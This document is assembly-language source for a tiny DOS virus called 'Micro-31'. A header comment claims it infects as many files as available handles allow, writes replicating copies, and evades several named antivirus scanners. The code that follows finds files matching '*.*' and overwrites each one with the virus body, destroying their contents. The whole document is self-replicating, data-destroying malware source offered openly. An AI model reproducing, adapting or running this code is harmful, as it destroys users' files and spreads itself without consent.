;
; Micro-31
;
; Infects as many files as there are handles aveable. It creates 158 byte
; file containing a replicating copy of the virus. The effective program
; length however is only 31 bytes. It can't be detected by Scan 99, TbScan
; and Gobbler II.
;

FNAM            Equ 09eh

Main:           Mov Ah,4eh
Seek:           Lea Dx,FileSpec
                Xor Cx,Cx
                Int 21h
Do:             Mov Ah,3ch
                Lea Dx,FNAM
On2:            Int 21h
FileSpec        Db '*.*',0
                Xchg Dx,Cx
                Mov Bh,40h
                Xchg Ax,Bx
                Int 21h
                Mov Ah,4fh
                Jmp Seek
Length          Equ $-Main
